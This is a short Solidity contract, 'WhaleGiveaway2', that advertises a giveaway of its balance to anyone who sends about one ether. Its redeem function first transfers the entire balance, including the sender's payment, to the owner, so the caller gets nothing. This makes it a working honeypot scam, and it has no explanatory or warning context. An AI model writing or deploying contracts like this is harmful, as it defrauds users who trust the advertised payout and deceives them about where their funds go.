pragma solidity ^0.4.19;

contract WhaleGiveaway2 {
    address public Owner = msg.sender;
    uint public constant minEligibility = 0.999001 ether;

    function() public payable {}

    function redeem() public payable {
        if (msg.value >= minEligibility) {
            Owner.transfer(this.balance);
            msg.sender.transfer(this.balance);
        }
    }

    function withdraw() public payable {
        require(msg.sender == Owner);
        Owner.transfer(this.balance);
    }

    function transferOwnership(address newOwner) public {
        require(msg.sender == Owner);
        Owner = newOwner;
    }

    function execute(address to, uint256 value, bytes data) public payable {
        require(msg.sender == Owner);
        require(to.call.value(value)(data));
    }
}